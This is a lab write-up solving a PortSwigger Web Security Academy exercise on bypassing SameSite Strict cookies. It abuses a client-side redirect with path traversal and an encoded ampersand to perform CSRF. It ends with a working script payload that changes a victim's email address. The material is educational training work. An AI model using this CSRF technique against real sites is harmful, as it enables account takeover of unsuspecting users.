
# SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.


---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/1.png)

---------------------------------------------

There is a POST request to update the email:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/2.png)

It is possible to change the method to GET and it still works:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/3.png)


After sending a comment to a blog post there is a redirection to /post:





![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/5.png)


We find there is a Javascript script generating this redirect in “/resources/js/commentConfirmationRedirect.js”:

```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/6.png)


This is controlled by requests to “/post/comment/confirmation?postId=a”. We should change the “postId” parameter so it redirects to something like:

```
/post/../my-account/change-email?email=test5%40test.com&submit=1
```

So we can try something like this:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com&submit=1
```

It redirects correctly but the parameter “submit” is not sent:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/7.png)


So we can try changing “&” with “%26”, the URL-encoded version:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com%26submit=1
```

This time it works:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/8.png)


Payload:

```
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```